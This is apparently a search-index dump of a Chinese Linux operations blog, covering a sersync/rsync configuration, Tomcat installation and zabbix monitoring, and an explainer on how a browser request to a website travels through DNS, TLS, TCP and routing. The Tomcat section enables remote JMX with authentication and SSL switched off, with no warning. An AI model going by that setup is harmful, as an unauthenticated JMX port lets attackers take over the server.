expression=\"(.*)\\.svn\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"(.*)\\.gz\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"^info/*\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"^static/*\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"(.*)/core\\.[0-9]+$\"\u003e\u003c/exclude\u003e \u003c/filter\u003e \u003cinotify\u003e \u003cdelete start=\"true\"/\u003e \u003ccreateFolder start=\"true\"/\u003e \u003ccreateFile start=\"true\"/\u003e \u003ccloseWrite start=\"true\"/\u003e \u003cmoveFrom start=\"true\"/\u003e \u003cmoveTo start=\"true\"/\u003e \u003cattrib start=\"false\"/\u003e \u003cmodify start=\"false\"/\u003e \u003c/inotify\u003e \u003csersync\u003e\u003c!-- 实际上就是rsync的命令及相关参数 --\u003e \u003clocalpath watch=\"/data/www\"\u003e \u003c!-- 同步的源,本地同步路径 --\u003e \u003cremote ip=\"172.16.10.11\" name=\"demo\"/\u003e \u003c!-- ip:rsync 服务的ip name:同步的模块(可跟上目录) --\u003e \u003c!--\u003cremote ip=\"192.168.8.39\" name=\"tongbu\"/\u003e--\u003e \u003c!--\u003cremote ip=\"192.168.8.40\" name=\"tongbu\"/\u003e--\u003e \u003c/localpath\u003e \u003crsync\u003e \u003ccommonParams params=\"-avz\"/\u003e \u003cauth start=\"true\" users=\"rsync_backup\" passwordfile=\"/etc/rsync.pas\"/\u003e \u003cuserDefinedPort start=\"false\" port=\"874\"/\u003e\u003c!-- port=874 --\u003e \u003ctimeout start=\"false\" time=\"100\"/\u003e\u003c!-- timeout=100 --\u003e \u003cssh start=\"false\"/\u003e \u003c/rsync\u003e \u003cfailLog path=\"/opt/sersync/logs/rsync_fail_log.sh\" timeToExecute=\"60\"/\u003e\u003c!--default every 60mins execute once--\u003e \u003ccrontab start=\"false\" schedule=\"600\"\u003e\u003c!--600mins--\u003e \u003ccrontabfilter start=\"false\"\u003e \u003cexclude expression=\"*.php\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"info/*\"\u003e\u003c/exclude\u003e \u003c/crontabfilter\u003e \u003c/crontab\u003e \u003cplugin start=\"false\" name=\"command\"/\u003e \u003c/sersync\u003e \u003cplugin name=\"command\"\u003e \u003cparam prefix=\"/bin/sh\" suffix=\"\" ignoreError=\"true\"/\u003e \u003c!--prefix /opt/tongbu/mmm.sh suffix--\u003e \u003cfilter start=\"false\"\u003e \u003cinclude expression=\"(.*)\\.php\"/\u003e \u003cinclude expression=\"(.*)\\.sh\"/\u003e \u003c/filter\u003e \u003c/plugin\u003e \u003cplugin name=\"socket\"\u003e \u003clocalpath watch=\"/opt/tongbu\"\u003e \u003cdeshost ip=\"192.168.138.20\" port=\"8009\"/\u003e \u003c/localpath\u003e \u003c/plugin\u003e \u003cplugin name=\"refreshCDN\"\u003e \u003clocalpath watch=\"/data0/htdocs/cms.xoyo.com/site/\"\u003e \u003ccdninfo domainname=\"ccms.chinacache.com\" port=\"80\" username=\"xxxx\" passwd=\"xxxx\"/\u003e \u003csendurl base=\"http://pic.xoyo.com/cms\"/\u003e \u003cregexurl regex=\"false\" match=\"cms.xoyo.com/site([/a-zA-Z0-9]*).xoyo.com/images\"/\u003e \u003c/localpath\u003e \u003c/plugin\u003e \u003c/head\u003e ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:4:2","tags":["linux","同步","rsync"],"title":"Sersync实时同步工具","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","整理收集"],"content":"Tcp.ip协议概述","date":"2022-06-22","objectID":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/","tags":["linux","tcp"],"title":"TCP/IP 协议概述","uri":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/"},{"categories":["linux","整理收集"],"content":" 引用 两张动图-彻底明白TCP的三次握手与四次挥手 ","date":"2022-06-22","objectID":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/:0:0","tags":["linux","tcp"],"title":"TCP/IP 协议概述","uri":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/"},{"categories":["linux","运维记事"],"content":"Tomcat安装及优化","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"/etc/profile ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:1:0","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"java export JAVA_HOME=/opt/jdk1.8.0_271 export PATH=$JAVA_HOME/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:2:0","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"tomcat export TOMCAT_HOME=/opt/tomcat-8.5.59 ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:3:0","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"日志 catalina.out 为主要日志文件，会随着时间不断增加 catalina.$(date +\"%Y-%m-%d\").log 为catalina.out的每日切割文件(实际好像不是，tomcat不会自动切割日志) ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:4:0","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"多实例 多实例就是多个tomcat，然后修改下端口就行了 ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:5:0","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"监控 ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:6:0","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"命令监控 jps -lvm show-busy-java-threads 查询到繁忙的java进程pid后,通过jstack \u003cpid\u003e查询详细信息，然后发送给开发人员即可 ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:6:1","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"zabbix 监控 系统尽量不要使用纯数字作为主机名 tomcat 开启远程监控功能 $\u003e vim +124 /opt/tomcat-8.5.59/bin/catalina.sh # 124 CATALINA_OPTS=\"$CATALINA_OPTS -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostsname=10.0.2.20 # tomcat服务器的ip \" zabbix_server 启动并配置 JavaGateway $\u003e vim /opt/zabbix-server/etc/zabbix_server.conf # 282 JavaGateway=10.0.2.11 JavaGatewayPort=10052 StartJavaPollers=5 $\u003e systemctl restart zabbix_server.service $\u003e /opt/zabbix-server/sbin/zabbix_java/startup.sh # 前端添加jmx 监控, 完成 ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:6:2","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"优化 根据文献记载，一个tomcat一般只部署一个站点, 清理webbapps下所有目录，新建ROOT将项目内容直接放到里面去，然后nginx反代即可 # 需要指定Host 等绑定参数，不然有坑 location / { proxy_pass http://jpress_server; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:7:0","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"具体优化见 常用web环境优化 ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:7:1","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","整理收集"],"content":"访问一个网页的全过程","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":" 引言 思考：请尽可能详细的写出从浏览器地址栏输入https://www.taobao.com之后到返回首页内容的整个过程中的交互细节。 这是我刚开始工作的时候，leader给的思考题，当时也是花了好多功夫才总结出来的，所以想记录一下。这个题目我在校招的时候也被问过，算是很重要的知识点 了。 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:0:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1. 用户从浏览器打开网页的过程 DNS解析 当将网页输入到浏览器会车后，浏览器会首先查询本地缓存和hosts文件，如果里面都没有这个域名的话，将会通过网卡配置的dns服务器(localdns)进行查找,如果localdns里面也查询不到这个域名服务器，localdns将会把这个请求发送到全球13台DNS根服务器(根服务器只管理顶级域名，又称为一级域名)进行查询 TCP三次握手建立连接 HTTP请求报文处理 请求方法URI协议/版本 请求头(Request Header) 请求正文 网站内部数据(发送、接收)整理响应 HTTP响应报文处理 TCP四次断开 应用层开始 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:1:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.1. 在浏览器输入https://www.taobao.com ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:2:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.1.1. 浏览器接收url开启网络请求线程,URL包括以下部分 protocol：协议头https host：主机域名www.taobao.com port：端口号(默认) path：无 query：无 fragment：无 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:2:1","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.1.2. https协议 https协议是基于http协议开发的,是比http更安全的协议,在http协议的基础上增加了SSL/TLS加密 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:2:2","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.2. DNS获取IP地址 一般，如果平台配备了负载均衡的话，前一步DNS解析获得的IP地址应该是Nginx负载均衡服务器的IP地址。所以，之后会将我们的网页请求发送到了Nginx负载均衡服务器上。 Nginx根据我们设定的分配算法和规则，选择一台后端的真实Web服务器，与之建立TCP连接、并转发我们浏览器发出去的网页请求。 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:3:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.2.1. 寻找IP地址过程: 请求一旦发起，浏览器首先要做的事情就是解析这个域名，一般来说，浏览器会首先查看本地硬盘的 hosts 文件，看看其中有没有和这个域名对应的规则，如果有的话就直接使用 hosts 文件里面的 ip 地址。 如果在本地的 hosts 文件没有能够找到对应的 ip 地址，浏览器会发出一个 DNS请求到本地DNS服务器 。本地DNS服务器一般都是你的网络接入服务器商提供，比如中国电信，中国移动。 查询你输入的网址的DNS请求到达本地DNS服务器之后，本地DNS服务器会首先查询它的缓存记录，如果缓存中有此条记录，就可以直接返回结果，此过程是递归的方式进行查询。如果没有，本地DNS服务器还要向DNS根服务器进行查询。 DNS根服务器没有记录具体的域名和IP地址的对应关系，于是告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址。这种过程是迭代的过程。 本地DNS服务器继续向域服务器发出请求，在这个例子中，请求的对象是.com域服务器。.com域服务器收到请求之后，也不会直接返回域名和IP地址的对应关系，而是告诉本地DNS服务器，你的域名的解析服务器的地址。 最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器不仅要把IP地址返回给用户电脑，还要把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。如果url里不包含端口号，则会使用该协议的默认端口号。 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:3:1","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.3. 根据HTTP协议生成HTTP请求报文 HTTP报文一般包括了： 请求/响应行，请求/响应头部，空白行，请求体/响应数据。 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:4:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.3.1. 请求 【请 求 行】请求方法 空格 请求资源地址(URI、无域名) 空格 HTTP版本 空格 CRLF(换行符) 【请 求 头】标识: 内容 CRLF(换行符) 【空 一 行】(表示请求头结束) 【请求 主体】（即请求正文，用户的主要数据。POST方式时使用，GET无请求主体） ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:4:1","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.3.2. 响应 【响 应 行】HTTP版本 空格 状态码 空格 状态码的文本描述 空格 CRLF(换行符) 【响 应 头】标识:内容 CRLF(换行符) 【空 一 行】(表示响应头结束) 【响应 主体】所谓响应主体，就是服务器返回的资源的内容。即整个HTML文件。 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:4:2","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.4. TLS进行加密,提供保密性和数据完整性 TLS是对SSL的改进,目标是为了更安全,可以确保数据发送到正确的客户端和服务器,途中防止被窃取,并且数据在过程中不发生改变. TLS 使用“消息认证代码的密钥散列法”，当记录在开放的网络（如因特网）上传送时，该代码确保记录不会被变更。 增强的伪随机功能（PRF）：PRF生成密钥数据。在TLS中，PRF使用两种散列算法保证其安全性。如果任一算法暴露了，只要第二种算法未暴露，数据仍然是安全的。 TLS提供更多的特定和附加警报，以指示任一会话端点检测到的问题。 TLS协商过程 客户端发出请求(ClientHello)，客户端表达想跟服务端安全进行通话 服务器回应 (ServerHello)，服务器收到并返回给客户端证书,拿去验证身份 客户端回应(Certificate Verify),客户端验证证书的真实性,如果有误发出警告并断开链接,如果无误,客户端就会取出公钥并把秘密消息加密发送至服务端 服务端最后回应(Server Finish),用私钥将客户端消息解密,然后处理并加密发给客户端,这时加密通道已经建立成功了.双方可以进行加密传输了. 应用层结束 在应用层将要发送的数据内容形成了应用层的报文data,发送到传输层 传输层开始 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:5:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.5. TCP三次握手 握手过程: 第一次握手：客户端给服务端发一个 SYN 报文，并指明客户端的初始化序列号 ISN©。此时客户端处于 SYN_Send状态。 第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，并且也是指定了自己的初始化序列号 ISN(s)，同时会把客户端的 ISN + 1 作为 ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD的状态 第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，当然，也是一样把服务器的 ISN + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文，此时客户端处于 establised状态。 服务器收到 ACK 报文之后，也处于 establised 状态，此时，双方以建立起了链接。 通俗点说就是: 客户端想要跟服务端进行通信,首先告知服务端一声:“我想跟你通信” 服务端收到客户端的连接请求,回一个确认消息:“我知道了,你现在能连吗?” 客户端收到服务端的确认消息后,礼貌的告知一下服务端:“好的,咱们开始通信吧” 传输层结束 这些数据通过传输层发送，比如tcp协议。所以它们会被送到传输层处理，在这里报文打上了传输头的包头，主要包含端口号，以及tcp的各种制信息，这些信息是直接得到的，因为接口中需要指定端口。这样就组成了tcp的数据传送单位segment。tcp是一种端到端的协议，利用这些信息，比如tcp首部中的序号确认序号，根据这些数字，发送的一方不断的进行发送等待确认，发送一个数据段后，会开启一个计数器，只有当收到确认后才会发送下一个，如果超过计数时间仍未收到确认则进行重发，在接受端如果收到错误数据，则将其丢弃，这将导致发送端超时重发。通过tcp协议，控制了数据包的发送序列的产生，不断的调整发送序列，实现流控和数据完整。然后待发送的数据段发送到网络层。 网络层开始 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:6:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.6. IP寻址 网络层开始负责将这样的数据包在网络上传输，如何穿过路由器，最终到达目的地址。在这里，根据目的ip地址，就需要查找下一跳路由的地址。首先在本机，要查找本机的路由表。 查找过程是这样的: 根据目的地址，得到目的网络号，如果处在同一个内网，则可以直接发送。 如果不是，则查询路由表，找到一个路由。 如果找不到明确的路由，此时在路由表中还会有默认网关，也可称为缺省网关，IP用缺省的网关地址将一个数据传送给下一个指定的路由器，所以网关也可能是路由器，也可能只是内网向特定路由器传输数据的网关。 路由器收到数据后，它再次为远程主机或网络查询路由，若还未找到路由，该数据包将发送到该路由器的缺省网关地址。而数据包中包含一个最大路由跳数，如果超过这个跳数，就会丢弃数据包，这样可以防止无限传递。路由器收到数据包后，只会查看网络层的包裹数据，目的ip。所以说它是工作在网络层，传输层的数据对它来说则是透明的。 如果上面这些步骤都没有成功，那么该数据报就不能被传送。如果不能传送的数据报来自本机，那么一般会向生成数据报的应用程序返回一个“主机不可达”或 “网络不可达”的错误。 关于NAT转换 如果是在局域网中,每台电脑都有自己的私网IP,在对外传输的时候,会经过NAT转换,改成路由器的公网IP ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:7:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.7. ARP协议获取MAC地址 ARP协议是将IP地址映射成MAC地址的,由于是IP协议使用了ARP协议,因此通常把ARP协议划归为网络层,但是ARP协议的用途是为了从网络层使用的IP地址解析出在数据链路层使用的MAC地址. 获取MAC地址过程: 主机生成一个具有目的IP地址(默认网关)的ARP查询报文,将该ARP报文放置在一个具有广播目的地址(例如FF:FF:FF:FF:FF:FF:FF)的以太网帧中,并向交换机发送该以太网帧,交换机将该帧交付给所有连接的设备,包括网关路由器。 网关路由器在接口上收到包含该ARP查询报文的帧,发现ARP报文中目的地址IP地址匹配接口的IP地址.网关路由器因此准备一个ARP回答,指示它的MAC地址对应报文中的IP地址,它将ARP回答放在一个以太网帧中,其目的地址是源MAC地址,并向交换机发送该帧,再由交换机将该帧交付给主机。 主机接收包含ARP回答报文的帧,并从ARP回答报文中抽取网关路由器的MAC地址。 将这个MAC地址将与IP包共同传输给下层。 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:8:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.8. BGP外部网关协议 在网络层用BGP协议来控制路由的传播和选择最佳路由。 路由更新时，BGP只发送更新的路由，大大减少了BGP传播路由所占用的带宽，适用于在Internet上传播大量的路由信息。 BGP路由通过携带AS路径信息彻底解决路由环路问题。 BGP提供了丰富的路由策略，能够对路由实现灵活的过滤和选择。 网络层结束 在网络层被打包，这样封装上了网络层的包头，包头内部含有源及目的的ip地址，该层数据发送单位被称为packet。 数据链路层开始 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:9:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.9. MAC寻址 首先通过广播获取足够的MAC地址表，交换机使用MAC地址通过指向相应端口的交换结构将网络通信转向目的节点。交换机为了知道要使用哪个端口来传送单播帧，它必须首先知道自己的每个端口上都存在哪些节点。 交换机使用其 MAC 地址表来确定如何处理传入的数据帧。通过记录与其每一个端口相连的节点的 MAC 地址来构建其 MAC 地址表。当某个特定端口上的某个特定节点的 MAC 地址记录到地址表之后，交换机就可以知道在后续传输中，应将目的地为该特定节点的流量从与该节点对应的端口上发出。 当交换机收到传入的数据帧，而地址表中没有该帧的目的MAC地址时，交换机将把该帧从除接收该帧的端口之外的所有端口转发出去。当目的节点响应时，交换机从响应帧的源地址字段中获得的该节点的MAC地址，并将其记录在地址表中。在多台交换机互连的网络中，连接其它交换机的端口MAC地址表中记录有多个MAC地址，用来代表远端节点。通常，用于互连两台交换机的交换机端口在MAC地址表中记录了多个MAC地址。 数据链路层结束 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:10:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.10. 服务器接受请求 用户发起的请求都指向调度服务器（反向代理服务器，譬如安装了nginx控制负载均衡），然后调度服务器根据实际的调度算法，分配不同的请求给对应集群中的服务器执行. 服务端将数据包通过数据链路层-\u003e网络层-\u003e传输层一层层的解封,最后处理HTTP中的请求 ","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:11:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"1.11. 服务端处理请求 首页请求 因为输入的url是请求进入网站首页的,不带任何参数请求,而且操作简单,这样下来QPS即每秒查询量是极大的,服务器需要在极短的时间内处理这些流量,这时候会用到CDN系统的缓存服务器将首页的图片迅速分发给用户。 在网站和用户之间引入CDN之后，用户不会有任何与原来不同的感觉。 使用CDN服务的网站，只需将其域名的解析权交给CDN的负载均衡设备，CDN负载均衡设备将为用户选择一台合适的缓存服务器，用户通过访问这台缓存服务器来获取自己所需的数据。 用户可以以最短的路径，最快的速度对网站进行访问。因此，CDN可以加速用户访问速度，减少源站中心负载压力。 其它请求 